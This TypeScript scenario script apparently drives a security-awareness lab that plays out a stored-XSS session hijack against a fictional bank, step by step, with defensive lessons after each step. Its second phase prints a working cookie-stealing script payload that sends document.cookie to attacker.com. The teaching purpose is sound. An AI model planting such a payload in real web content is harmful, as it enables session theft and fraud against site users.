import { ScenarioScript } from '../lab-engine';

export const sessHijackScript: ScenarioScript = {
    id: 'sess-01',

    victimScreens: [
        { id: 'logged-in',        type: 'browser', url: 'https://corpbank.com/dashboard', content: 'LOGGED_IN' },
        { id: 'devtools-open',    type: 'browser', url: 'https://corpbank.com/dashboard', content: 'DEVTOOLS_OPEN' },
        { id: 'cookie-visible',   type: 'browser', url: 'https://corpbank.com/dashboard', content: 'COOKIE_VISIBLE' },
        { id: 'cookie-stolen',    type: 'browser', url: 'https://corpbank.com/comments',  content: 'COOKIE_STOLEN' },
        { id: 'session-hijacked', type: 'browser', url: 'https://corpbank.com/dashboard', content: 'SESSION_HIJACKED' },
        { id: 'compromised',      type: 'result',  url: 'https://corpbank.com',           content: 'COMPROMISED' },
    ],

    phases: [
        // ── PHASE 1 — RECON ───────────────────────────────────────────────
        {
            id: 'recon',
            name: 'RECONNAISSANCE',
            autoPlay: true,
            progressPct: 15,
            victimScreen: 'logged-in',
            terminalLines: [
                { text: '══════════════════════════════════════', type: 'dim',     delay: 0 },
                { text: '  ATTACKER TERMINAL — Session Hijack', type: 'dim',     delay: 100 },
                { text: '══════════════════════════════════════', type: 'dim',     delay: 200 },
                { text: '',                                      type: 'dim',     delay: 300 },
                { text: '[*] Target is logged into corpbank.com', type: 'info',  delay: 500 },
                { text: '[*] Analysing session management...',   type: 'info',    delay: 1000 },
                { text: '',                                      type: 'dim',     delay: 1400 },
                { text: 'curl -I https://corpbank.com',          type: 'command', delay: 1700 },
                { text: 'Set-Cookie: PHPSESSID=abc123; Path=/', type: 'output',   delay: 2500, trigger: 'devtools-open' },
                { text: '[!] Missing: HttpOnly flag',            type: 'warning', delay: 3000 },
                { text: '[!] Missing: Secure flag',              type: 'warning', delay: 3400 },
                { text: '[!] Missing: SameSite attribute',       type: 'warning', delay: 3800 },
                { text: '[+] Session cookie is vulnerable!',     type: 'success', delay: 4300, trigger: 'cookie-visible' },
                { text: '[+] JavaScript can read this cookie',   type: 'success', delay: 4700 },
            ],
            agentMessages: [
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'The attacker analysed your site headers and found your session cookie is missing three critical security flags. HttpOnly prevents JavaScript from reading the cookie. Without it XSS can steal your session.',
                },
                {
                    agent: 'guardian', type: 'redflag',
                    text: 'Your session cookie is missing HttpOnly and Secure flags. These are basic security configurations that take seconds to add but prevent entire classes of attacks.',
                },
            ],
            nextPhase: 'xss-inject',
        },

        // ── PHASE 2 — XSS INJECT ──────────────────────────────────────────
        {
            id: 'xss-inject',
            name: 'STORED XSS INJECTED',
            autoPlay: false,
            progressPct: 35,
            victimScreen: 'cookie-visible',
            terminalLines: [
                { text: '',                                      type: 'dim',     delay: 0 },
                { text: '[*] Finding XSS entry point...',        type: 'info',    delay: 300 },
                { text: '[+] Comment field is injectable',       type: 'success', delay: 900 },
                { text: '[*] Posting malicious comment:',        type: 'info',    delay: 1400 },
                { text: '    <script>',                          type: 'data',    delay: 1700 },
                { text: '      var i = new Image();',            type: 'data',    delay: 1900 },
                { text: "      i.src = 'http://attacker.com/?c='",type: 'data',  delay: 2100 },
                { text: '      + document.cookie;',              type: 'data',    delay: 2300 },
                { text: '    </script>',                         type: 'data',    delay: 2500 },
                { text: '[+] Comment posted successfully',       type: 'success', delay: 3000 },
                { text: '[*] Waiting for victim to load page...', type: 'dim',   delay: 3500 },
            ],
            agentMessages: [
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'The attacker posted a comment containing hidden JavaScript. Every user who views that comment page will silently send their session cookie to the attacker server. This is a stored XSS attack — more dangerous than reflected XSS.',
                },
                {
                    agent: 'guardian', type: 'redflag',
                    text: "A malicious script has been posted to your site as a comment. User generated content must always be sanitised before storing or displaying. This is stored XSS — it affects every user who views the content.",
                },
            ],
            decisionPoint: {
                id: 'session-decision',
                question: 'You notice your session keeps expiring unexpectedly. What do you do?',
                description: 'Full attack plays out to show complete session hijacking process.',
                choices: [
                    { label: '🔄 Just log back in — probably a timeout', safe: false, consequence: 'Your new session token will also be stolen — the script is still there' },
                    { label: '🚨 Report to IT — something seems wrong',   safe: true,  consequence: 'Correct — unexpected logouts can indicate session theft' },
                ],
            },
            nextPhase: 'cookie-stolen',
        },

        // ── PHASE 3 — COOKIE STOLEN ───────────────────────────────────────
        {
            id: 'cookie-stolen',
            name: 'COOKIE EXFILTRATED',
            autoPlay: true,
            progressPct: 55,
            victimScreen: 'cookie-visible',
            terminalLines: [
                { text: '',                                      type: 'dim',     delay: 0 },
                { text: '[+] Victim loaded the comments page!',  type: 'warning', delay: 300, trigger: 'cookie-stolen' },
                { text: '[+] Cookie received!',                  type: 'success', delay: 900 },
                { text: '[+] PHPSESSID: abc123def456xyz789qrs',  type: 'data',    delay: 1300 },
                { text: '[*] Session token captured successfully', type: 'info',  delay: 1800 },
                { text: '[*] Checking session validity...',      type: 'info',    delay: 2400 },
                { text: '[+] Session is active and valid!',      type: 'success', delay: 3100 },
            ],
            agentMessages: [
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'The moment you loaded the comments page your session cookie was silently sent to the attacker. You saw nothing unusual. This happens in milliseconds — before you even finish reading the page.',
                },
                {
                    agent: 'guardian', type: 'alert',
                    text: 'Session token compromised. The attacker has a copy of your active login session. Go to account settings and log out of all other sessions immediately. Then change your password.',
                },
            ],
            nextPhase: 'hijack',
        },

        // ── PHASE 4 — HIJACK ──────────────────────────────────────────────
        {
            id: 'hijack',
            name: 'SESSION REPLAYED',
            autoPlay: true,
            progressPct: 80,
            victimScreen: 'cookie-stolen',
            terminalLines: [
                { text: '',                                      type: 'dim',     delay: 0 },
                { text: '[*] Opening browser with stolen cookie...', type: 'info', delay: 300 },
                { text: '[*] Navigating to corpbank.com...',     type: 'info',    delay: 800 },
                { text: '[*] Injecting session cookie...',       type: 'info',    delay: 1300 },
                { text: '[+] Page loaded as authenticated user!', type: 'success', delay: 1900, trigger: 'session-hijacked' },
                { text: '[+] Logged in as: john.smith@corpbank.com', type: 'data', delay: 2300 },
                { text: '[+] Account balance: visible',          type: 'data',    delay: 2700 },
                { text: '[+] Transaction history: visible',      type: 'data',    delay: 3000 },
                { text: '[+] Personal details: visible',         type: 'data',    delay: 3300 },
                { text: '[*] Initiating fund transfer...',       type: 'warning', delay: 3800 },
                { text: '[+] Transfer of $5,000 initiated!',     type: 'error',   delay: 4600 },
            ],
            agentMessages: [
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'The server cannot tell the difference between you and the attacker — both have the same valid session token. The attacker just transferred money from your account. 2FA would not have helped here — the session was already authenticated.',
                },
                {
                    agent: 'guardian', type: 'alert',
                    text: 'Unauthorised fund transfer detected. Contact your bank immediately to reverse the transaction. File a fraud report. Revoke all active sessions and enable 2FA before logging back in.',
                },
            ],
            nextPhase: 'compromised',
        },

        // ── PHASE 5 — COMPROMISED ─────────────────────────────────────────
        {
            id: 'compromised',
            name: 'ATTACK COMPLETE',
            autoPlay: true,
            progressPct: 100,
            victimScreen: 'compromised',
            terminalLines: [
                { text: '',                                      type: 'dim',     delay: 0 },
                { text: '[+] ATTACK COMPLETE',                   type: 'error',   delay: 300 },
                { text: '[+] Fund transfer: $5,000',             type: 'data',    delay: 700 },
                { text: '[+] Personal data: exfiltrated',        type: 'data',    delay: 1000 },
                { text: '[+] Session active for: 47 minutes',    type: 'data',    delay: 1300 },
                { text: '[+] Victim unaware until too late',     type: 'error',   delay: 1700 },
            ],
            agentMessages: [
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'Session hijacking is defeated by three things: HttpOnly cookies prevent JavaScript theft, short session timeouts limit the attack window, and re-authentication for sensitive actions like transfers adds a final layer of protection.',
                },
                {
                    agent: 'mentor', type: 'lesson',
                    text: 'In 2010 the Firesheep tool demonstrated session hijacking on public WiFi and captured 200,000 sessions in days — forcing Facebook and Twitter to enforce HTTPS sitewide permanently.',
                },
                {
                    agent: 'guardian', type: 'prevention',
                    text: 'Future prevention: set HttpOnly and Secure flags on all cookies, implement short session timeouts, require re-authentication for sensitive actions, sanitise all user content, add Content Security Policy headers.',
                },
            ],
        },
    ],
};
